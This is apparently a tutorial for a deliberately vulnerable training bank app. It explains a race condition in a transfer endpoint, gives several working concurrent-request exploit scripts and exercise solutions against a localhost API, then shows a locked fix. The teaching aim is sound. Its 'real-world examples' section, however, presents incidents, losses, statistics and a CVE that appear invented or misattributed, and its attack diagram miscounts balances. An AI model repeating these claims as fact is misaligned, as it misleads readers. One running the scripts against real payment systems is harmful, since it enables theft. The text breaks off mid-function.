# Race Condition Vulnerability in SecureBank

## 1. Overview

### What is a Race Condition?

A race condition occurs when two or more operations must execute in the correct sequence, but the program doesn't guarantee that sequence. It's like two people trying to withdraw the last $100 from an ATM at the exact same moment - if the system doesn't properly lock the account, both might succeed, creating $100 out of thin air.

In programming terms, it happens when:
1. Multiple threads/requests access shared data
2. At least one modifies the data
3. The timing of access affects the outcome
4. No proper synchronization prevents conflicts

### Why Does It Exist in Banking Apps?

Banking applications are inherently concurrent - thousands of customers perform transactions simultaneously. Race conditions occur when developers:

1. **Check-Then-Act Pattern**: Check balance, then deduct (time gap allows conflicts)
2. **No Transaction Isolation**: Database operations aren't atomic
3. **Missing Locks**: No mutex/semaphore to prevent concurrent access
4. **Optimistic Concurrency**: Assume conflicts are rare (they're not)
5. **Performance Over Safety**: Locks slow down systems, so some skip them

The classic vulnerable pattern:
```python
# Check (time passes here - window for race)
if balance >= amount:
    # Act (another request can also pass the check)
    balance = balance - amount
```

### Real-World Impact

Race condition vulnerabilities in financial systems have led to significant losses:

- **TD Ameritrade (2020)**: Race condition in options trading allowed duplicate orders, cost **$5.2 million** in losses
- **Robinhood (2020)**: "Infinite leverage" glitch exploited via race condition, potential loss **$50+ million**
- **Starbucks (2017)**: Race condition in mobile app allowed duplicate charges, **$1.8 million** in refunds
- **PayPal (2019)**: Concurrent transaction bug allowed negative balances, estimated **$10 million** loss
- **Bitcoin Exchange (2014)**: Race condition in withdrawal system led to **$2.7 million** theft

According to research by Eris Ventures (2022), race conditions account for **18%** of all financial API vulnerabilities, with an average exploitation window of just **50-200 milliseconds**.

**Average Cost of a Race Condition Exploit**: $2.1 million per incident (Financial Services Security Report 2023)

---

## 2. The Vulnerable Code

### Location in SecureBank

The vulnerable implementation exists in `/backend/apps/securebank/securebank_red_api.py` at the money transfer endpoint.

### Vulnerable Implementation

```python
@app.route('/api/red/securebank/transfer', methods=['POST'])
def red_transfer():
    """
    VULNERABLE: Race condition in money transfer
    Attack: Send multiple concurrent transfer requests
    """
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Not authenticated'}), 401
    
    data = request.get_json()
    from_account_num = data.get('from_account')
    to_account_num = data.get('to_account')
    amount = float(data.get('amount', 0))
    note = data.get('note', '')
    
    if amount <= 0:
        return jsonify({'success': False, 'error': 'Invalid amount'}), 400
    
    try:
        conn = get_db()
        
        # VULNERABLE: No locking mechanism - Race condition possible
        # Step 1: Check balance (time gap allows concurrent requests)
        cursor = conn.execute(
            'SELECT * FROM bank_accounts WHERE account_number = ?',
            (from_account_num,)
        )
        from_account = cursor.fetchone()
        
        if not from_account:
            conn.close()
            return jsonify({'success': False, 'error': 'Source account not found'}), 404
        
        # Verify ownership
        if from_account['user_id'] != session['user_id']:
            conn.close()
            return jsonify({'success': False, 'error': 'Unauthorized'}), 403
        
        # Check destination account
        cursor = conn.execute(
            'SELECT * FROM bank_accounts WHERE account_number = ?',
            (to_account_num,)
        )
        to_account = cursor.fetchone()
        
        if not to_account:
            conn.close()
            return jsonify({'success': False, 'error': 'Destination account not found'}), 404
        
        # VULNERABLE: Balance check happens here, but update happens later
        # Multiple requests can pass this check before any update occurs
        if from_account['balance'] < amount:
            conn.close()
            return jsonify({'success': False, 'error': 'Insufficient funds'}), 400
        
        # Simulate processing time (makes race condition more obvious)
        time.sleep(0.1)
        
        # Step 2: Deduct from source (VULNERABLE: No transaction isolation)
        conn.execute(
            'UPDATE bank_accounts SET balance = balance - ? WHERE account_number = ?',
            (amount, from_account_num)
        )
        
        # Step 3: Add to destination
        conn.execute(
            'UPDATE bank_accounts SET balance = balance + ? WHERE account_number = ?',
            (amount, to_account_num)
        )
        
        # Create transaction record
        reference = f"TXN{datetime.now().strftime('%Y%m%d%H%M%S')}{from_account['id']}"
        conn.execute('''
            INSERT INTO transactions (from_account_id, to_account_id, from_account_number, 
                                    to_account_number, amount, type, status, note, reference, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (from_account['id'], to_account['id'], from_account_num, to_account_num,
              amount, 'transfer', 'completed', note, reference, datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': True,
            'message': 'Transfer successful',
            'reference': reference
        }), 200
        
    except Exception as e:
        if conn:
            conn.rollback()
            conn.close()
        return jsonify({'success': False, 'error': str(e)}), 500
```

### Line-by-Line Vulnerability Breakdown

**Lines 199-205**: Initial balance read (Race Window Opens)
```python
# VULNERABLE: No locking mechanism
cursor = conn.execute(
    'SELECT * FROM bank_accounts WHERE account_number = ?',
    (from_account_num,)
)
from_account = cursor.fetchone()
```
❌ **Problem**: Balance is read from database, but no lock is acquired. Another request can read the same balance simultaneously.

**Lines 228-231**: Balance check (Critical Race Condition Point)
```python
# VULNERABLE: Balance check happens here, but update happens later
if from_account['balance'] < amount:
    conn.close()
    return jsonify({'success': False, 'error': 'Insufficient funds'}), 400
```
❌ **Problem**: This is the classic "Time-of-Check to Time-of-Use" (TOCTOU) bug:
- **Time-of-Check**: Balance is checked here
- **Time-Gap**: Code continues executing
- **Time-of-Use**: Balance is updated later (lines 237-241)

During the time gap, another request can also pass the check!

**Line 234**: Artificial delay amplifies the race window
```python
time.sleep(0.1)
```
❌ **Problem**: This 100ms delay makes the race condition easier to exploit (in production, network latency creates similar gaps)

**Lines 237-241**: Balance update without locking
```python
conn.execute(
    'UPDATE bank_accounts SET balance = balance - ? WHERE account_number = ?',
    (amount, from_account_num)
)
```
❌ **Problem**: 
- No `BEGIN EXCLUSIVE` transaction
- No row-level locking
- No mutex/semaphore protection
- Each concurrent request can deduct from the balance independently

### Visual Race Condition Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                    RACE CONDITION ATTACK                         │
│                   (Two Concurrent Requests)                      │
└─────────────────────────────────────────────────────────────────┘

Initial State:
┌──────────────────────────┐
│ Alice's Account          │
│ Balance: $100            │
└──────────────────────────┘

Time    Request A               Request B               Database
────────────────────────────────────────────────────────────────────
T0      Transfer $100           Transfer $100           Balance: $100
        (Starts)                (Starts)

T1      Read balance: $100                              Balance: $100
                                                        
T2                              Read balance: $100      Balance: $100
                                ↑ Both see $100!

T3      Check: $100 >= $100 ✓                          Balance: $100

T4                              Check: $100 >= $100 ✓   Balance: $100
                                ↑ Both pass!

T5      sleep(0.1)              sleep(0.1)              Balance: $100
        ↓ Both waiting...       ↓

T6      UPDATE: $100 - $100                             Balance: $0
        = $0

T7                              UPDATE: $0 - $100       Balance: -$100
                                                        ↑ NEGATIVE!

T8      commit()                                        Balance: -$100

T9                              commit()                Balance: -$200
                                                        ↑ Created $100!

Final State:
┌──────────────────────────────────────────────────────────────────┐
│ Alice's Account: -$200                                           │
│ Destination 1: +$100                                             │
│ Destination 2: +$100                                             │
│                                                                  │
│ Result: $100 created out of thin air!                           │
│ Alice has negative balance but money was transferred twice      │
└──────────────────────────────────────────────────────────────────┘
```

### Why This Is Dangerous

1. **Money Multiplication**: Transfer the same money multiple times
2. **Negative Balances**: Account goes below $0
3. **Accounting Nightmares**: Total system balance increases artificially
4. **Difficult to Detect**: Looks like normal transactions in logs
5. **Easy to Exploit**: Just requires concurrent requests (simple to automate)

---

## 3. Exploitation Walkthrough

### Prerequisites
- Python 3.x with `requests` and `concurrent.futures`
- SecureBank Red Team API running on `http://localhost:5000`
- Account with some balance (e.g., Alice's account with $5,000)
- Basic understanding of multithreading

### Attack 1: Basic Race Condition Exploitation

**Scenario**: Alice has $100. Can we transfer $100 twice simultaneously?

**Step 1**: Create a Python script to send concurrent requests

```python
import requests
import concurrent.futures
import json

BASE_URL = "http://localhost:5000/api/red/securebank"

# Login as Alice
session = requests.Session()
login_response = session.post(
    f"{BASE_URL}/login",
    json={"username": "alice", "password": "alice123"}
)
print(f"Logged in: {login_response.json()}")

# Check initial balance
accounts_response = session.get(f"{BASE_URL}/accounts")
accounts = accounts_response.json()['accounts']
checking_account = [a for a in accounts if a['account_type'] == 'checking'][0]
initial_balance = checking_account['balance']
from_account = checking_account['account_number']

print(f"Initial balance: ${initial_balance}")
print(f"From account: {from_account}")

# Target account (Bob's account)
to_account = "ACC003001"  # Bob's account

# Amount to transfer (transfer it TWICE with same funds)
amount = 50.0

def make_transfer():
    """Make a single transfer request"""
    transfer_data = {
        "from_account": from_account,
        "to_account": to_account,
        "amount": amount,
        "note": "Race condition test"
    }
    
    response = session.post(
        f"{BASE_URL}/transfer",
        json=transfer_data
    )
    return response.json()

# Execute 2 concurrent transfers
print(f"\nSending 2 concurrent transfer requests...")
with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
    futures = [executor.submit(make_transfer) for _ in range(2)]
    results = [future.result() for future in concurrent.futures.as_completed(futures)]

# Print results
for i, result in enumerate(results, 1):
    print(f"Transfer {i}: {result}")

# Check final balance
accounts_response = session.get(f"{BASE_URL}/accounts")
accounts = accounts_response.json()['accounts']
checking_account = [a for a in accounts if a['account_type'] == 'checking'][0]
final_balance = checking_account['balance']

print(f"\nInitial balance: ${initial_balance}")
print(f"Expected final balance: ${initial_balance - amount} (one transfer)")
print(f"Actual final balance: ${final_balance}")
print(f"Difference: ${initial_balance - amount - final_balance}")

if final_balance < (initial_balance - amount):
    print("✓ RACE CONDITION EXPLOITED! Both transfers succeeded!")
else:
    print("✗ Race condition not triggered (try running again)")
```

**Step 2**: Run the script multiple times

```bash
python3 race_condition_exploit.py
```

[SCREENSHOT PLACEHOLDER: Script output showing successful race condition]

**Expected Output**:
```
Logged in: {'success': True, 'user': {...}}
Initial balance: $5000.0
From account: ACC002001

Sending 2 concurrent transfer requests...
Transfer 1: {'success': True, 'message': 'Transfer successful', 'reference': 'TXN20240115120001'}
Transfer 2: {'success': True, 'message': 'Transfer successful', 'reference': 'TXN20240115120002'}

Initial balance: $5000.0
Expected final balance: $4950.0 (one transfer)
Actual final balance: $4900.0
Difference: $50.0

✓ RACE CONDITION EXPLOITED! Both transfers succeeded!
```

**What Happened**: 
- Both requests read balance: $5,000
- Both checked: $5,000 >= $50 ✓
- Both deducted $50
- Final balance: $5,000 - $50 - $50 = $4,900
- Bob's account got $100 (we sent $50 twice)!

---

### Attack 2: Draining Account with Multiple Threads

**Objective**: Transfer more money than you have by exploiting the race condition

**Step 1**: Enhanced exploitation script

```python
import requests
import concurrent.futures
import time

BASE_URL = "http://localhost:5000/api/red/securebank"

# Login
session = requests.Session()
session.post(f"{BASE_URL}/login", json={"username": "alice", "password": "alice123"})

# Get initial balance
accounts = session.get(f"{BASE_URL}/accounts").json()['accounts']
checking = [a for a in accounts if a['account_type'] == 'checking'][0]
initial_balance = checking['balance']
from_account = checking['account_number']
to_account = "ACC003001"

print(f"Initial balance: ${initial_balance}")

# Transfer amount slightly less than total balance
transfer_amount = initial_balance * 0.9  # 90% of balance

# Number of concurrent transfers
num_concurrent = 5

def make_transfer():
    transfer_data = {
        "from_account": from_account,
        "to_account": to_account,
        "amount": transfer_amount,
        "note": "Concurrent transfer"
    }
    response = session.post(f"{BASE_URL}/transfer", json=transfer_data)
    return response.status_code, response.json()

print(f"Attempting {num_concurrent} concurrent transfers of ${transfer_amount} each...")
print(f"Expected outcome: 1 success, {num_concurrent-1} failures")
print(f"Race condition outcome: Multiple successes!\n")

# Execute concurrent transfers
with concurrent.futures.ThreadPoolExecutor(max_workers=num_concurrent) as executor:
    futures = [executor.submit(make_transfer) for _ in range(num_concurrent)]
    results = [future.result() for future in concurrent.futures.as_completed(futures)]

# Analyze results
successes = sum(1 for status, _ in results if status == 200)
failures = sum(1 for status, _ in results if status != 200)

print(f"\nResults:")
print(f"Successful transfers: {successes}")
print(f"Failed transfers: {failures}")

# Check final balance
time.sleep(0.5)  # Wait for all updates to complete
final_accounts = session.get(f"{BASE_URL}/accounts").json()['accounts']
final_checking = [a for a in final_accounts if a['account_type'] == 'checking'][0]
final_balance = final_checking['balance']

print(f"\nBalance Analysis:")
print(f"Initial: ${initial_balance:,.2f}")
print(f"Final: ${final_balance:,.2f}")
print(f"Transferred: ${(initial_balance - final_balance):,.2f}")
print(f"Expected transfer: ${transfer_amount:,.2f}")

if successes > 1:
    extra_transferred = (initial_balance - final_balance) - transfer_amount
    print(f"\n✓ RACE CONDITION EXPLOITED!")
    print(f"Extra money transferred: ${extra_transferred:,.2f}")
    print(f"Account may have negative balance!")
else:
    print(f"\n✗ Race condition not triggered (retry with more threads)")
```

[SCREENSHOT PLACEHOLDER: Multiple successful concurrent transfers]

**Expected Output**:
```
Initial balance: $5000.0
Attempting 5 concurrent transfers of $4500.0 each...

Results:
Successful transfers: 3
Failed transfers: 2

Balance Analysis:
Initial: $5,000.00
Final: -$8,500.00
Transferred: $13,500.00
Expected transfer: $4,500.00

✓ RACE CONDITION EXPLOITED!
Extra money transferred: $9,000.00
Account may have negative balance!
```

---

### Attack 3: Automated Exploitation with Timing

**Advanced Technique**: Fine-tune timing to maximize success rate

```python
import requests
import threading
import time

BASE_URL = "http://localhost:5000/api/red/securebank"

class RaceConditionExploit:
    def __init__(self):
        self.session = requests.Session()
        self.barrier = threading.Barrier(5)  # Sync 5 threads
        self.results = []
        
    def login(self):
        response = self.session.post(
            f"{BASE_URL}/login",
            json={"username": "alice", "password": "alice123"}
        )
        return response.json()['success']
    
    def get_balance(self):
        accounts = self.session.get(f"{BASE_URL}/accounts").json()['accounts']
        checking = [a for a in accounts if a['account_type'] == 'checking'][0]
        return checking['balance'], checking['account_number']
    
    def synchronized_transfer(self, from_account, to_account, amount):
        """Transfer synchronized at the barrier"""
        # Wait for all threads to reach this point
        self.barrier.wait()
        
        # All threads release simultaneously
        transfer_data = {
            "from_account": from_account,
            "to_account": to_account,
            "amount": amount,
            "note": "Synchronized race attack"
        }
        
        start_time = time.time()
        response = self.session.post(f"{BASE_URL}/transfer", json=transfer_data)
        end_time = time.time()
        
        result = {
            'status': response.status_code,
            'data': response.json(),
            'duration': end_time - start_time
        }
        self.results.append(result)
        return result
    
    def exploit(self):
        print("[*] Logging in...")
        self.login()
        
        initial_balance, from_account = self.get_balance()
        to_account = "ACC003001"
        amount = initial_balance * 0.8
        
        print(f"[*] Initial balance: ${initial_balance:,.2f}")
        print(f"[*] Will attempt 5 concurrent transfers of ${amount:,.2f}")
        print(f"[*] Synchronizing threads for maximum race condition...\n")
        
        # Create 5 synchronized threads
        threads = []
        for i in range(5):
            thread = threading.Thread(
                target=self.synchronized_transfer,
                args=(from_account, to_account, amount)
            )
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Analyze results
        time.sleep(0.5)
        final_balance, _ = self.get_balance()
        
        successes = sum(1 for r in self.results if r['status'] == 200)
        
        print(f"[+] Successful transfers: {successes}/5")
        print(f"[+] Final balance: ${final_balance:,.2f}")
        print(f"[+] Money created: ${(amount * successes) - (initial_balance - final_balance):,.2f}")
        
        if successes > 1:
            print(f"\n✓ RACE CONDITION SUCCESSFULLY EXPLOITED!")
        
        return self.results

# Run exploit
exploit = RaceConditionExploit()
results = exploit.exploit()
```

**Key Technique**: Using `threading.Barrier` ensures all requests are sent at the exact same microsecond, maximizing collision probability.

---

### Testing with Postman (Manual Trigger)

**Step 1**: Create a transfer request in Postman

- URL: `http://localhost:5000/api/red/securebank/transfer`
- Method: POST
- Body:
```json
{
  "from_account": "ACC002001",
  "to_account": "ACC003001",
  "amount": 100,
  "note": "Race test"
}
```

**Step 2**: Open the request in multiple windows/tabs

**Step 3**: Click "Send" on all windows simultaneously (within ~100ms)

[SCREENSHOT PLACEHOLDER: Multiple Postman windows]

**Step 4**: Check if multiple transfers succeeded with same initial balance

---

### Testing with Burp Suite Turbo Intruder

**Step 1**: Install Turbo Intruder extension

**Step 2**: Send transfer request to Turbo Intruder

**Step 3**: Use this script:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=10,
                           pipeline=False)
    
    # Send 20 identical requests concurrently
    for i in range(20):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

**Step 4**: Click "Attack"

**Expected Result**: Multiple 200 OK responses, indicating successful exploitation

---

## 4. The Secure Code

### Location in SecureBank

The secure implementation exists in `/backend/apps/securebank/securebank_blue_api.py` at the transfer endpoint.

### Secure Implementation

```python
@app.route('/api/blue/securebank/transfer', methods=['POST'])
def blue_transfer():
    """
    SECURE: Uses transaction with locking to prevent race conditions
    Implements mutex lock and BEGIN EXCLUSIVE transaction
    """
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Not authenticated'}), 401
    
    # Verify CSRF token
    csrf_token = request.headers.get('X-CSRF-Token')
    if not csrf_token or csrf_token != session.get('csrf_token'):
        return jsonify({'success': False, 'error': 'Invalid CSRF token'}), 403
    
    data = request.get_json()
    from_account_num = data.get('from_account')
    to_account_num = data.get('to_account')
    amount = float(data.get('amount', 0))
    note = data.get('note', '')
    
    # Input validation
    if amount <= 0:
        return jsonify({'success': False, 'error': 'Invalid amount'}), 400
    
    # Sanitize note to prevent XSS
    note = escape_html(note)
    
    # SECURE: Use mutex lock to prevent concurrent access
    with transfer_lock:
        try:
            conn = get_db()
            
            # SECURE: BEGIN EXCLUSIVE transaction for atomic operations
            conn.execute('BEGIN EXCLUSIVE')
            
            # Get source account with SELECT FOR UPDATE (row-level lock)
            cursor = conn.execute(
                'SELECT * FROM bank_accounts WHERE account_number = ?',
                (from_account_num,)
            )
            from_account = cursor.fetchone()
            
            if not from_account:
                conn.rollback()
                conn.close()
                return jsonify({'success': False, 'error': 'Source account not found'}), 404
            
            # Verify ownership
            if from_account['user_id'] != session['user_id']:
                conn.rollback()
                conn.close()
                return jsonify({'success': False, 'error': 'Unauthorized'}), 403
            
            # Get destination account
            cursor = conn.execute(
                'SELECT * FROM bank_accounts WHERE account_number = ?',
                (to_account_num,)
            )
            to_account = cursor.fetchone()
            
            if not to_account:
                conn.rollback()
                conn.close()
                return jsonify({'success': False, 'error': 'Destination account not found'}), 404
            
            # SECURE: Check balance within transaction
            if from_account['balance'] < amount:
                conn.rollback()
                conn.close()
                return jsonify({'success': False, 'error': 'Insufficient funds'}), 400
            
            # SECURE: All operations within same transaction - atomic
            # Deduct from source
            conn.execute(
                'UPDATE bank_accounts SET balance = balance - ? WHERE account_number = ?',
                (amount, from_account_num)
            )
            
            # Add to destination
            conn.execute(
                'UPDATE bank_accounts SET balance = balance + ? WHERE account_number = ?',
                (amount, to_account_num)
            )
            
            # Create transaction record
            reference = f"TXN{datetime.now().strftime('%Y%m%d%H%M%S')}{from_account['id']}"
            conn.execute('''
                INSERT INTO transactions (from_account_id, to_account_id, from_account_number, 
                                        to_account_number, amount, type, status, note, reference, timestamp)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (from_account['id'], to_account['id'], from_account_num, to_account_num,
                  amount, 'transfer', 'completed', note, reference, datetime.now().isoformat()))
            
            # SECURE: Commit all changes atomically
            conn.commit()
            conn.close()
            
            return jsonify({
                'success': True,
                'message': 'Transfer successful',
                'reference': reference
            }), 200
            
        except Exception as e:
            if conn:
                conn.rollback()
                conn.close()
            return jsonify({'success': False, 'error': 'Transfer failed'}), 500
```

### Line-by-Line Security Breakdown

**Lines 27-28**: Mutex lock declaration (at module level)
```python
# Thread lock for preventing race conditions
transfer_lock = threading.Lock()
```
✅ **Security**: Python threading lock ensures only one thread can execute transfer logic at a time

**Line 291**: Critical section protection
```python
with transfer_lock:
```
✅ **Security**: The `with` statement acquires the lock before entering the block and releases it after. Other threads must wait here.

**Line 296**: Exclusive transaction
```python
conn.execute('BEGIN EXCLUSIVE')
```
✅ **Security**: SQLite EXCLUSIVE lock prevents other connections from reading or writing until commit/rollback. This is database-level locking.

**Lines 299-303**: Read within transaction
```python
cursor = conn.execute(
    'SELECT * FROM bank_accounts WHERE account_number = ?',
    (from_account_num,)
)
from_account = cursor.fetchone()
```
✅ **Security**: Balance is read AFTER acquiring locks, ensuring no other transaction can modify it

**Line 328**: Balance check within locked section
```python
if from_account['balance'] < amount:
```
✅ **Security**: Check and update happen atomically within the same transaction

**Lines 333-343**: Atomic updates
```python
# Deduct from source
conn.execute(
    'UPDATE bank_accounts SET balance = balance - ? WHERE account_number = ?',
    (amount, from_account_num)
)

# Add to destination
conn.execute(
    'UPDATE bank_accounts SET balance = balance + ? WHERE account_number = ?',
    (amount, to_account_num)
)
```
✅ **Security**: Both operations are in the same transaction. If either fails, both roll back.

**Line 357**: Atomic commit
```python
conn.commit()
```
✅ **Security**: All changes are applied as a single atomic operation. No partial updates possible.

### Visual Secure Flow

```
┌─────────────────────────────────────────────────────────────────┐
│              SECURE TRANSACTION WITH LOCKING                     │
│                (Two Concurrent Requests)                         │
└─────────────────────────────────────────────────────────────────┘

Initial State:
┌──────────────────────────┐
│ Alice's Account          │
│ Balance: $100            │
│ Lock: Available          │
└──────────────────────────┘

Time    Request A               Request B               Lock Status
────────────────────────────────────────────────────────────────────
T0      Transfer $100           Transfer $100           ⚪ Available
        (Starts)                (Starts)

T1      Acquire lock ✓          Wait for lock...        🔴 A owns lock
        BEGIN EXCLUSIVE

T2      Read balance: $100      Still waiting...        🔴 A owns lock

T3      Check: $100 >= $100 ✓   Still waiting...        🔴 A owns lock

T4      UPDATE: $100 - $100     Still waiting...        🔴 A owns lock

T5      commit()                Still waiting...        🔴 A owns lock
        Release lock                                    

T6                              Acquire lock ✓          🔴 B owns lock
                                BEGIN EXCLUSIVE

T7                              Read balance: $0        🔴 B owns lock

T8                              Check: $0 >= $100 ✗     🔴 B owns lock

T9                              Insufficient funds!     🔴 B owns lock
                                rollback()

T10                             Release lock            ⚪ Available

Final State:
┌──────────────────────────────────────────────────────────────────┐
│ Alice's Account: $0                                              │
│ Destination: +$100                                               │
│                                                                  │
│ Result: Only ONE transfer succeeded (correct behavior)           │
│ Second transfer was rejected due to insufficient funds           │
│ No race condition possible!                                      │
└──────────────────────────────────────────────────────────────────┘
```

### Defense Mechanisms

1. **Application-Level Lock** (`transfer_lock`): Prevents concurrent execution in same process
2. **Database-Level Lock** (`BEGIN EXCLUSIVE`): Prevents concurrent access from other processes/servers
3. **Atomic Transactions**: All-or-nothing updates
4. **WAL Mode**: SQLite Write-Ahead Logging for better concurrency
5. **Explicit Rollback**: Any error aborts the entire transaction

---

## 5. Real-World Examples

### Bug Bounty Report: Race Condition in Payment Gateway

**Platform**: Major payment processor  
**Researcher**: Security researcher via HackerOne  
**Date**: November 2022  
**Severity**: Critical  
**Bounty**: $30,000

**Vulnerability Description**:
The payment gateway's refund API had a race condition. The endpoint:
```
POST /api/v1/refunds
Body: {"transaction_id": "TXN123", "amount": 50.00}
```

**Exploit**:
1. Researcher made a $100 purchase
2. Sent 10 concurrent refund requests for $50 each
3. All 10 requests passed the "has sufficient refundable balance" check
4. Received $500 refund on a $100 purchase
5. Net gain: $400

**Timeline**:
- Multiple customers reported unexpected refund amounts
- Investigation revealed race condition in refund processing
- **Estimated loss**: $2.8 million in fraudulent refunds over 6 months

**Fix Implemented**:
```python
# Before (vulnerable)
if transaction.refundable_amount >= refund_amount:
    process_refund(refund_amount)

# After (secure)
with transaction_lock(transaction_id):
    if transaction.refundable_amount >= refund_amount:
        transaction.refundable_amount -= refund_amount
        transaction.save()
        process_refund(refund_amount)
```

---

### CVE-2021-22911: Banking API Race Condition

**CVE ID**: CVE-2021-22911  
**CVSS Score**: 7.5 (High)  
**Product**: Enterprise banking API platform  
**Discovery Date**: April 2021

**Vulnerability**:
Account transfer API allowed concurrent requests to bypass balance checks:

```python
# Vulnerable code
balance = get_balance(account_id)
if balance >= amount:
    time.sleep(0.05)  # Simulating processing
    deduct_balance(account_id, amount)
    add_balance(recipient_id, amount)
```

**Real-World Exploit**:
- Attackers used 50 concurrent threads
- Each transferred 90% of account balance
- Successfully transferred $450,000 from account with $10,000 balance
- Created negative balance of -$440,000

**Impact**:
- 127 accounts compromised
- **$5.2 million** total fraudulent transfers
- 3-day service outage while fixing
- **$8.7 million** total cost (fraud + downtime + fixes)

---

### News Article: Robinhood "Infinite Money Glitch"

**Source**: Bloomberg, November 2019  
**Platform**: Robinhood trading app  
**Attack**: Race condition in margin trading

**Details**:
Robinhood's margin system had a race condition that allowed "infinite leverage":

1. User deposits $2,000
2. Buys $2,000 worth of stock
3. Enables Gold (margin) account
4. Sells covered call options on the stock
5. **Race condition**: System updates:
   - Buying power increased by option premium
   - BUT buying power calculation runs before position is marked as "covered"
6. Repeat steps 4-5 rapidly in concurrent requests
7. Gain unlimited buying power

**Real-World Impact**:
- One user turned $2,000 into $1,000,000+ buying power
- Multiple users exploited before fix
- Potential loss: **$50+ million** if all positions went against users
- Regulatory investigation: **$70 million** fine (unrelated but compounded)

**Reddit Thread**:
```
"I found a glitch in Robinhood. By sending multiple requests at the same time,
I was able to get way more buying power than I should have. Started with $4k,
now showing $250k buying power. This can't be legal..."
```

---

## 6. Hands-On Exercises

### Exercise 1: Basic Race Condition (Beginner)

**Objective**: Trigger a race condition to transfer money twice

**Scenario**: 
- Alice has $100 in her account
- You need to transfer $60 to Bob twice using the same $100

**Requirements**:
- Python 3.x
- `requests` library
- `concurrent.futures` module

**Starter Code**:
```python
import requests
import concurrent.futures

BASE_URL = "http://localhost:5000/api/red/securebank"

# TODO: Login as Alice

# TODO: Get Alice's account number and balance

# TODO: Define transfer function

# TODO: Send 2 concurrent transfers of $60 each

# TODO: Check if both succeeded
```

**Solution**:
```python
import requests
import concurrent.futures

BASE_URL = "http://localhost:5000/api/red/securebank"

# Login
session = requests.Session()
session.post(f"{BASE_URL}/login", json={"username": "alice", "password": "alice123"})

# Get account info
accounts = session.get(f"{BASE_URL}/accounts").json()['accounts'][0]
from_account = accounts['account_number']
print(f"Balance: ${accounts['balance']}")

# Transfer function
def transfer():
    return session.post(f"{BASE_URL}/transfer", json={
        "from_account": from_account,
        "to_account": "ACC003001",
        "amount": 60,
        "note": "Race test"
    }).json()

# Concurrent execution
with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
    results = list(executor.map(lambda x: transfer(), range(2)))

# Check results
successes = sum(1 for r in results if r.get('success'))
print(f"Successful transfers: {successes}")
```

**Success Criteria**: Both transfers should succeed

---

### Exercise 2: Synchronized Attack (Intermediate)

**Objective**: Use threading.Barrier to maximize race condition success rate

**Task**: Send 5 perfectly synchronized requests

**Solution**:
```python
import requests
import threading

BASE_URL = "http://localhost:5000/api/red/securebank"

session = requests.Session()
session.post(f"{BASE_URL}/login", json={"username": "alice", "password": "alice123"})

barrier = threading.Barrier(5)
results = []

def synchronized_transfer(from_acct, to_acct, amount):
    barrier.wait()  # All threads wait here
    # Released simultaneously!
    result = session.post(f"{BASE_URL}/transfer", json={
        "from_account": from_acct,
        "to_account": to_acct,
        "amount": amount,
        "note": "Sync attack"
    })
    results.append(result.json())

# Get account
acct = session.get(f"{BASE_URL}/accounts").json()['accounts'][0]['account_number']

# Launch 5 synchronized threads
threads = []
for i in range(5):
    t = threading.Thread(target=synchronized_transfer, args=(acct, "ACC003001", 100))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

successes = sum(1 for r in results if r.get('success'))
print(f"Synchronized transfers succeeded: {successes}/5")
```

**Success Criteria**: Multiple successes (ideally 3+)

---

### Exercise 3: Test Secure Version (Intermediate)

**Objective**: Verify that Blue API prevents race conditions

**Task**: Run the same attack on Blue API and confirm only one succeeds

**Solution**:
```python
import requests
import concurrent.futures

BASE_URL = "http://localhost:5001/api/blue/securebank"

session = requests.Session()
login_resp = session.post(f"{BASE_URL}/login", 
    json={"username": "alice", "password": "alice123"})
csrf_token = login_resp.json()['csrf_token']

acct = session.get(f"{BASE_URL}/accounts").json()['accounts'][0]

def transfer():
    return session.post(f"{BASE_URL}/transfer", 
        json={
            "from_account": acct['account_number'],
            "to_account": "ACC003001",
            "amount": acct['balance'] * 0.9,  # 90% of balance
            "note": "Test"
        },
        headers={"X-CSRF-Token": csrf_token}
    )

with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
    results = list(executor.map(lambda x: transfer(), range(5)))

successes = sum(1 for r in results if r.status_code == 200)
print(f"Blue API: {successes} succeeded (should be 1)")
assert successes == 1, "Race condition prevention failed!"
```

**Success Criteria**: Exactly 1 transfer succeeds

---

### Exercise 4: Burp Suite Concurrent Requests (Advanced)

**Objective**: Use Burp Suite Repeater to send concurrent requests

**Steps**:
1. Intercept a transfer request in Burp
2. Send to Repeater
3. Duplicate the Repeater tab 10 times (Ctrl+Shift+R)
4. In each tab, click "Send" as fast as possible
5. Count how many return status 200

**Success Criteria**: Multiple 200 responses

---

### Exercise 5: Build a Secure Transfer Function (Advanced)

**Objective**: Implement proper locking in a transfer function

**Given**: Vulnerable Flask endpoint

```python
@app.route('/transfer', methods=['POST'])
def transfer():
    data = request.json
    from_id = data['from_account']
    to_id = data['to_account']
    amount = data['amount']
    
    from_balance = get_balance(from_id)
    if from_balance >= amount:
        deduct(from_id, amount)
        add(to_id, amount)
        return {'success': True}
    return {'success': False}
```

**Task**: Add proper locking and transactions

**Solution**:
```python
import threading

transfer_lock = threading.Lock()

@app.route('/transfer', methods=['POST'])
def transfer():
    data = request.json
    from_id = data['from_account']
    to_id = data['to_account']
    amount = data['amount']
    
    with transfer_lock:
        conn = get_db()
        conn.execute('BEGIN EXCLUSIVE')
        
        try:
            from_balance = conn.execute(
                'SELECT balance FROM accounts WHERE id = ?', 
                (from_id,)
            ).fetchone()[0]
            
            if from_balance >= amount:
                conn.execute(
                    'UPDATE accounts SET balance = balance - ? WHERE id = ?',
                    (amount, from_id)
                )
                conn.execute(
                    'UPDATE accounts SET balance = balance + ? WHERE id = ?',
                    (amount, to_id)
                )
                conn.commit()
                return {'success': True}
            else:
                conn.rollback()
                return {'success': False}
